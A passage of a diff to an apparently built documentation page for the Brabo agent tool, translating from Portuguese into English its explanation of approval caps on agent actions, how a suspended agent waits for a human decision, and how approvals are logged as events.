+<table><thead><tr><th>cap<th>effect<th>why<tbody><tr><td><code>git_merge</code> with destination in <code>dev</code>, <code>qa</code>, <code>rc</code> or <code>main</code><td><code>auto_approve</code> → <code>require_approval</code><td>merge into a protected branch is always your decision (<a class="" href=/brabo/qa/business-rules#rn-006>RN-006</a>)<tr><td><code>instruction_patch</code><td><code>auto_approve</code> → <code>require_approval</code><td>you need to see the diff before one agent changes another's behavior (<a class="" href=/brabo/qa/business-rules#rn-007>RN-007</a>)<tr><td><code>parallelize</code> and <code>raise_max_parallel</code><td><code>auto_approve</code> → <code>require_approval</code><td>spending on more agents is your decision; without this cap the lead's limit would be decorative, and raising the cap itself would be the product raising its own spending limit (<a class="" href=/brabo/qa/business-rules#rn-086>RN-086</a>)<tr><td><code>terminal</code> with external-effect git (push/PR/deploy) or <code>sudo</code>/<code>doas</code><td><code>auto_approve</code> → <code>require_approval</code><td>external-effect git and privileged commands are never auto-approvable, even with "automatic mode" on (<a class="" href=/brabo/qa/business-rules#rn-418>RN-418</a>, revises <a class="" href=/brabo/qa/business-rules#rn-106>RN-106</a>) — see the dedicated section above</table>
+<p>A cap downgrades <code>auto_approve</code> to <code>require_approval</code>; it does <strong>not</strong>
+turn <code>deny</code> into something else, because <code>deny</code> would have already
+returned earlier.</p>
+<p>:::note Why <code>rc</code> is still on the list</p>
+<p>The <code>rc</code> rung left the branch policy
+(<a class="" href=/brabo/qa/adr/0030-politica-de-branches-mecanizada>ADR 0030</a>) and the
+bootstrap stopped creating it (<a class="" href=/brabo/qa/business-rules#rn-029>RN-029</a>) —
+but it's still here, in <code>domain/actions/protected-branches.ts</code>.</p>
+<p>This list decides what the merge lock <strong>refuses</strong>, and repositories
+bootstrapped by earlier versions of Brabo still have the branch. Removing
+it from here wouldn't remove anything from anyone's repository: it would
+only make a <code>git_merge</code> with destination <code>rc</code> auto-approvable, on a branch
+someone might be using as production.</p>
+<p>Protecting a branch that doesn't exist costs nothing. Unprotecting one
+that exists costs dearly — and the asymmetry is deliberate.</p>
 <p>:::</p>
-<p>A diferença entre um teto e um default: o default é o que acontece quando
-ninguém configurou nada; o teto é o que acontece <strong>independente</strong> do que foi
-configurado.</p>
-<h2 class="anchor anchorTargetStickyNavbar_URsz" id=o-que-acontece-com-o-agente-enquanto-a-decisão-não-vem>O que acontece com o agente enquanto a decisão não vem<a href=#o-que-acontece-com-o-agente-enquanto-a-decisão-não-vem class=hash-link aria-label="Link direto para O que acontece com o agente enquanto a decisão não vem" title="Link direto para O que acontece com o agente enquanto a decisão não vem" translate=no>​</a></h2>
-<p>Uma ação <code>pending</code> não é só uma linha esperando clique: do outro lado há um
-agente parado.</p>
-<p>Quando a ferramenta que ele chamou fica pendente, o laço dele <strong>suspende</strong>
-retendo task, worktree e o histórico da conversa, e ele entra em
-<code>awaiting_approval</code>. Sua decisão emite <code>task.action_settled</code>, que o acorda: o
-resultado real do comando ocupa o lugar onde estaria a resposta, e o laço retoma
-do ponto em que parou.</p>
-<p><strong>Recusar também responde.</strong> O motivo entra no lugar do resultado, e o agente
-aprende que aquele caminho está fechado em vez de esperar para sempre — negar
-não o deixa travado.</p>
-<p>Isso importa para quem opera: aprovar tarde não desperdiça o trabalho já feito,
-e a fila de aprovações não é assíncrona por conveniência — ela é o que o agente
-está literalmente esperando. Antes disso, o <code>pending</code> voltava como se fosse a
-resposta do comando, e o agente gastava o teto de iterações tentando outra coisa
-até a task morrer sem uma linha escrita
-(<a class="" href=/brabo/qa/business-rules#rn-073>RN-073</a>).</p>
-<p><strong>Com uma exceção: reinício do engine.</strong> O laço suspenso vive em memória, então
-um restart o leva junto. Nesse caso a task <strong>não</strong> fica esperando: ela volta
-para a fila bloqueada, com o motivo e origem <code>infra</code> no event log, e uma decisão
-tomada depois disso não tem mais onde ser aplicada — a ação decidida fica
-registrada, mas o turno que a esperava não existe mais. Se você aprovou e nada
-aconteceu, é esse o primeiro lugar para olhar.</p>
-<p>A auto-aprovação não passa por aqui: ela executa na proposta e o resultado volta
-no mesmo turno — que é justamente o valor de ter os padrões da seção anterior.</p>
-<h2 class="anchor anchorTargetStickyNavbar_URsz" id=o-que-fica-escrito-de-cada-decisão>O que fica escrito de cada decisão<a href=#o-que-fica-escrito-de-cada-decisão class=hash-link aria-label="Link direto para O que fica escrito de cada decisão" title="Link direto para O que fica escrito de cada decisão" translate=no>​</a></h2>
-<p>Toda ação proposta e toda decisão sobre ela viram <strong>evento de domínio</strong> em
-<code>session_events</code>, com o ator real (<a class="" href=/brabo/qa/business-rules#rn-049>RN-049</a>):</p>
+<p>The difference between a cap and a default: the default is what happens
+when nobody configured anything; the cap is what happens <strong>regardless</strong> of
+what was configured.</p>
+<h2 class="anchor anchorTargetStickyNavbar_URsz" id=what-happens-to-the-agent-while-the-decision-doesnt-come>What happens to the agent while the decision doesn't come<a href=#what-happens-to-the-agent-while-the-decision-doesnt-come class=hash-link aria-label="Direct link to What happens to the agent while the decision doesn't come" title="Direct link to What happens to the agent while the decision doesn't come" translate=no>​</a></h2>
+<p>A <code>pending</code> action isn't just a row waiting for a click: on the other side
+there's an agent stopped.</p>
+<p>When the tool it called becomes pending, its loop <strong>suspends</strong>, holding on
+to the task, the worktree, and the conversation history, and it enters
+<code>awaiting_approval</code>. Your decision emits <code>task.action_settled</code>, which
+wakes it up: the real result of the command takes the place where the
+response would be, and the loop resumes from where it stopped.</p>
+<p><strong>Refusing also responds.</strong> The reason takes the place of the result, and
+the agent learns that path is closed instead of waiting forever — denying
+doesn't leave it stuck.</p>
+<p>This matters for whoever operates: approving late doesn't waste the work
+already done, and the approval queue isn't asynchronous for convenience —
+it's literally what the agent is waiting for. Before this, <code>pending</code> came
+back as if it were the command's response, and the agent burned its
+iteration cap trying something else until the task died without a single
+line written (<a class="" href=/brabo/qa/business-rules#rn-073>RN-073</a>).</p>
+<p><strong>With one exception: engine restart.</strong> The suspended loop lives in
+memory, so a restart takes it down with it. In that case the task does
+<strong>not</strong> stay waiting: it goes back to the blocked queue, with the reason
+and origin <code>infra</code> in the event log, and a decision made after that has
+nowhere left to be applied — the decided action stays recorded, but the
+turn that was waiting for it no longer exists. If you approved and nothing
+happened, this is the first place to look.</p>
+<p>Auto-approval doesn't go through here: it executes at the proposal and the
+result comes back in the same turn — which is exactly the value of having
+the patterns from the previous section.</p>
+<p><strong>The Dev Lead suspends the same way, with one difference on restart</strong>
+(ADR 0086, <a class="" href=/brabo/qa/business-rules#rn-284>RN-284</a>). It's conversational, it
+has no worktree or task — what suspends is the turn's synchronous
+<code>handle_call</code>, via <code>agent.status: awaiting_approval</code>. Unlike the dev
+agent, it does NOT have a queue to return to on an engine restart: the
+decision remains recorded and visible in Approvals, but the Dev Lead
+doesn't narrate the outcome on its own — the process that was waiting
+died, and the next restart brings up a new Dev Lead, with no subscription
+for that action. An accepted and declared gap, not a disguised one.</p>
+<h2 class="anchor anchorTargetStickyNavbar_URsz" id=what-gets-written-for-each-decision>What gets written for each decision<a href=#what-gets-written-for-each-decision class=hash-link aria-label="Direct link to What gets written for each decision" title="Direct link to What gets written for each decision" translate=no>​</a></h2>
+<p>Every proposed action and every decision about it become a <strong>domain
+event</strong> in <code>session_events</code>, with the real actor
+(<a class="" href=/brabo/qa/business-rules#rn-049>RN-049</a>):</p>
 
 
 
@@ -455,22 +549,22 @@ no mesmo turno — que é justamente o valor de ter os padrões da seção anter
 
 
 
-<table><thead><tr><th>evento<th>ator<th>quando<tbody><tr><td><code>proposed_action.created</code><td>o <strong>agente</strong> que propôs<td>sempre, antes de qualquer execução. <code>payload.status</code> diz como a ação nasceu: <code>pending</code>, <code>auto_approved</code> ou <code>denied</code><tr><td><code>proposed_action.approved</code><td>o <strong>usuário</strong> que clicou<td>só na aprovação manual (inclusive <code>approve_always</code>)<tr><td><code>proposed_action.denied</code><td>o <strong>usuário</strong> que recusou<td>com <code>payload.reason</code><tr><td><code>action.executed</code> / <code>action.failed</code><td><code>system</code><td>desfecho da execução</table>
-<p>Daí sai a única forma confiável de separar as duas coisas que este documento
-descreve:</p>
+<table><thead><tr><th>event<th>actor<th>when<tbody><tr><td><code>proposed_action.created</code><td>the <strong>agent</strong> that proposed it<td>always, before any execution. <code>payload.status</code> says how the action was born: <code>pending</code>, <code>auto_approved</code>, or <code>denied</code><tr><td><code>proposed_action.approved</code><td>the <strong>user</strong> who clicked<td>only on manual approval (including <code>approve_always</code>)<tr><td><code>proposed_action.denied</code><td>the <strong>user</strong> who refused<td>with <code>payload.reason</code><tr><td><code>action.executed</code> / <code>action.failed</code><td><code>system</code><td>execution outcome</table>
+<p>From this comes the only reliable way to separate the two things this
+document describes:</p>
 <ul>
-<li class=""><strong>decisão humana</strong> = contar eventos <code>proposed_action.approved</code>;</li>
-<li class=""><strong>decisão da política</strong> = <code>proposed_action.created</code> com
-<code>status: auto_approved</code> e ator agente. Ela nunca produz um <code>.approved</code>, e por
-isso nunca é confundida com um clique.</li>
+<li class=""><strong>human decision</strong> = count <code>proposed_action.approved</code> events;</li>
+<li class=""><strong>policy decision</strong> = <code>proposed_action.created</code> with <code>status: auto_approved</code> and an agent actor. It never produces a <code>.approved</code>, and
+so it's never confused with a click.</li>
 </ul>
-<p>Isso não era verdade até a Fase 12e. As três primeiras linhas iam <strong>só para o
-outbox</strong>, que é transporte — drenado, marcado com <code>processed_at</code> e podado — e a
-decisão sobrevivia apenas em <code>proposed_actions.decided_at</code>, uma coluna fora da
-linha do tempo que a UI, o Psicólogo e a Anamnese leem. O resultado prático foi
-que "quantas vezes o humano aprovou" não pôde ser respondido no dogfooding da
-Fase 10, que era justamente a métrica principal daquele experimento.</p>
-<p>O bootstrap de repositório é a exceção deliberada: as mutações que ele propõe
-não emitem <code>proposed_action.created</code> no log, porque já são narradas por
-<code>bootstrap.step_*</code> na mesma sessão — contá-las de novo inflaria a métrica de
-aprovação com trabalho que ninguém aprovou.</div></div></div><div class=row><div class="col col--12"><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_M5Wn"><a href=https://github.com/daneiel/brabo/blob/dev/docs/reference/permissions.md target=_blank rel="noopener noreferrer" class=theme-edit-this-page><svg fill=currentColor height=20 width=20 viewBox="0 0 40 40" class=iconEdit_eJZs aria-hidden=true><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"/></g></svg>Editar esta página</a></div><div class="col lastUpdated_y3Pe"><span class=theme-last-updated>Última atualização<!-- --> em <b><time datetime=2026-08-14T03:20:40.000Z itemprop=dateModified>14 de ago. de 2026</time></b> por <b>Daniel Souza</b></span></div></div></footer></div></div></article><div class=row><div class="col col--12"><nav class="docusaurus-mt-lg pagination-nav" aria-label="Páginas de documento"><a class="pagination-nav__link pagination-nav__link--prev" href=/brabo/qa/reference/events><div class=pagination-nav__sublabel>Anterior</div><div class=pagination-nav__label>Eventos</div></a><a class="pagination-nav__link pagination-nav__link--next" href=/brabo/qa/reference/artifacts><div class=pagination-nav__sublabel>Próxima</div><div class=pagination-nav__label>Artefatos</div></a></nav></div></div></div></div><div class="col col--3"><div class="tableOfContents_P_6G thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href=#o-arquivo class="table-of-contents__link toc-highlight">O arquivo</a><ul><li><a href=#com-qual-credencial-a-ação-auto-aprovada-executa class="table-of-contents__link toc-highlight">Com qual credencial a ação auto-aprovada executa</a></ul><li><a href=#o-formato-do-padrão class="table-of-contents__link toc-highlight">O formato do padrão</a><li><a href=#como-um-padrão-casa-com-um-comando class="table-of-contents__link toc-highlight">Como um padrão casa com um comando</a><li><a href=#comando-composto class="table-of-contents__link toc-highlight">Comando composto</a><li><a href=#padrões-embutidos class="table-of-contents__link toc-highlight">Padrões embutidos</a><li><a href=#o-que-a-ativação-da-execução-semeia class="table-of-contents__link toc-highlight">O que a ativação da execução semeia</a><li><a href=#a-ordem-completa-da-decisão class="table-of-contents__link toc-highlight">A ordem completa da decisão</a><ul><li><a href=#auto-mode-a-curinga-de-agent_autonomy-rn-153 class="table-of-contents__link toc-highlight">"Auto mode": a curinga de <code>agent_autonomy</code> (RN-153)</a></ul><li><a href=#a-fronteira-do-container-rn-106 class="table-of-contents__link toc-highlight">A fronteira do container (RN-106)</a><li><a href=#escopo-de-caminho class="table-of-contents__link toc-highlight">Escopo de caminho</a><li><a href=#os-tetos class="table-of-contents__link toc-highlight">Os tetos</a><li><a href=#o-que-acontece-com-o-agente-enquanto-a-decisão-não-vem class="table-of-contents__link toc-highlight">O que acontece com o agente enquanto a decisão não vem</a><li><a href=#o-que-fica-escrito-de-cada-decisão class="table-of-contents__link toc-highlight">O que fica escrito de cada decisão</a></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class=footer__title>Documentação</div><ul class="footer__items clean-list"><li class=footer__item><a class=footer__link-item href=/brabo/qa/getting-started>Primeiros passos</a><li class=footer__item><a class=footer__link-item href=/brabo/qa/architecture>Arquitetura</a><li class=footer__item><a class=footer__link-item href=/brabo/qa/business-rules>Regras de negócio</a><li class=footer__item><a class=footer__link-item href=/brabo/qa/runbook>Runbook</a></ul></div><div class="theme-layout-footer-column col footer__col"><div class=footer__title>Comunidade</div><ul class="footer__items clean-list"><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class=footer__link-item>Como contribuir<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/SUPPORT.md target=_blank rel="noopener noreferrer" class=footer__link-item>Onde pedir ajuda<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/SECURITY.md target=_blank rel="noopener noreferrer" class=footer__link-item>Segurança<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a></ul></div><div class="theme-layout-footer-column col footer__col"><div class=footer__title>Mais</div><ul class="footer__items clean-list"><li class=footer__item><a href=https://github.com/daneiel/brabo target=_blank rel="noopener noreferrer" class=footer__link-item>GitHub<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/CHANGELOG.md target=_blank rel="noopener noreferrer" class=footer__link-item>CHANGELOG<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/LICENSE target=_blank rel="noopener noreferrer" class=footer__link-item>Licença MIT<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/THIRD_PARTY_NOTICES.md target=_blank rel="noopener noreferrer" class=footer__link-item>Avisos de terceiros<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a></ul></div></div><div class="footer__bottom text--center"><div class=footer__copyright>Copyright © 2026 Daniel Souza. Licenciado sob a MIT. Ferramentas de terceiros mantêm as próprias licenças — ver Avisos de terceiros.</div></div></div></footer></div></body>
+<p>This wasn't true until Phase 12e. The first three rows went <strong>only to the
+outbox</strong>, which is transport — drained, marked with <code>processed_at</code>, and
+pruned — and the decision survived only in <code>proposed_actions.decided_at</code>,
+a column outside the timeline that the UI, the Psychologist, and the
+Anamnesis read. The practical result was that "how many times did the
+human approve" couldn't be answered in the Phase 10 dogfooding, which was
+exactly that experiment's main metric.</p>
+<p>Repository bootstrap is the deliberate exception: the mutations it
+proposes don't emit <code>proposed_action.created</code> in the log, because they're
+already narrated by <code>bootstrap.step_*</code> in the same session — counting them
+again would inflate the approval metric with work nobody approved.</div></div></div><div class=row><div class="col col--12"><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_M5Wn"><a href=https://github.com/daneiel/brabo/blob/dev/docs/reference/permissions.md target=_blank rel="noopener noreferrer" class=theme-edit-this-page><svg fill=currentColor height=20 width=20 viewBox="0 0 40 40" class=iconEdit_eJZs aria-hidden=true><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"/></g></svg>Edit this page</a></div><div class="col lastUpdated_y3Pe"><span class=theme-last-updated>Last updated<!-- --> on <b><time datetime=2026-08-24T04:07:03.000Z itemprop=dateModified>Aug 24, 2026</time></b> by <b>Daniel Souza</b></span></div></div></footer></div></div></article><div class=row><div class="col col--12"><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href=/brabo/qa/reference/events><div class=pagination-nav__sublabel>Previous</div><div class=pagination-nav__label>Events</div></a><a class="pagination-nav__link pagination-nav__link--next" href=/brabo/qa/reference/artifacts><div class=pagination-nav__sublabel>Next</div><div class=pagination-nav__label>Artifacts</div></a></nav></div></div></div></div><div class="col col--3"><div class="tableOfContents_P_6G thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href=#the-file class="table-of-contents__link toc-highlight">The file</a><ul><li><a href=#with-which-credential-the-auto-approved-action-executes class="table-of-contents__link toc-highlight">With which credential the auto-approved action executes</a></ul><li><a href=#the-pattern-format class="table-of-contents__link toc-highlight">The pattern format</a><li><a href=#how-a-pattern-matches-a-command class="table-of-contents__link toc-highlight">How a pattern matches a command</a><li><a href=#compound-command class="table-of-contents__link toc-highlight">Compound command</a><li><a href=#built-in-patterns class="table-of-contents__link toc-highlight">Built-in patterns</a><li><a href=#what-activating-execution-seeds class="table-of-contents__link toc-highlight">What activating execution seeds</a><li><a href=#the-complete-decision-order class="table-of-contents__link toc-highlight">The complete decision order</a><ul><li><a href=#auto-mode-the-agent_autonomy-wildcard-rn-153 class="table-of-contents__link toc-highlight">"Auto mode": the <code>agent_autonomy</code> wildcard (RN-153)</a></ul><li><a href=#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418 class="table-of-contents__link toc-highlight">The boundary of external effect and privileged command (RN-418)</a><li><a href=#path-scope class="table-of-contents__link toc-highlight">Path scope</a><li><a href=#caps class="table-of-contents__link toc-highlight">Caps</a><li><a href=#what-happens-to-the-agent-while-the-decision-doesnt-come class="table-of-contents__link toc-highlight">What happens to the agent while the decision doesn't come</a><li><a href=#what-gets-written-for-each-decision class="table-of-contents__link toc-highlight">What gets written for each decision</a></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class=footer__title>Documentação</div><ul class="footer__items clean-list"><li class=footer__item><a class=footer__link-item href=/brabo/qa/getting-started>Primeiros passos</a><li class=footer__item><a class=footer__link-item href=/brabo/qa/architecture>Arquitetura</a><li class=footer__item><a class=footer__link-item href=/brabo/qa/business-rules>Regras de negócio</a><li class=footer__item><a class=footer__link-item href=/brabo/qa/runbook>Runbook</a></ul></div><div class="theme-layout-footer-column col footer__col"><div class=footer__title>Comunidade</div><ul class="footer__items clean-list"><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/CONTRIBUTING.md target=_blank rel="noopener noreferrer" class=footer__link-item>Como contribuir<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/SUPPORT.md target=_blank rel="noopener noreferrer" class=footer__link-item>Onde pedir ajuda<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/SECURITY.md target=_blank rel="noopener noreferrer" class=footer__link-item>Segurança<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a></ul></div><div class="theme-layout-footer-column col footer__col"><div class=footer__title>Mais</div><ul class="footer__items clean-list"><li class=footer__item><a href=https://github.com/daneiel/brabo target=_blank rel="noopener noreferrer" class=footer__link-item>GitHub<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/CHANGELOG.md target=_blank rel="noopener noreferrer" class=footer__link-item>CHANGELOG<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/LICENSE target=_blank rel="noopener noreferrer" class=footer__link-item>Licença MIT<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a><li class=footer__item><a href=https://github.com/daneiel/brabo/blob/dev/THIRD_PARTY_NOTICES.md target=_blank rel="noopener noreferrer" class=footer__link-item>Avisos de terceiros<svg width=13.5 height=13.5 aria-label="(opens in new tab)" class=iconExternalLink_lgoI><use href=#theme-svg-external-link /></svg></a></ul></div></div><div class="footer__bottom text--center"><div class=footer__copyright>Copyright © 2026 Daniel Souza. Licenciado sob a MIT. Ferramentas de terceiros mantêm as próprias licenças — ver Avisos de terceiros.</div></div></div></footer></div></body>
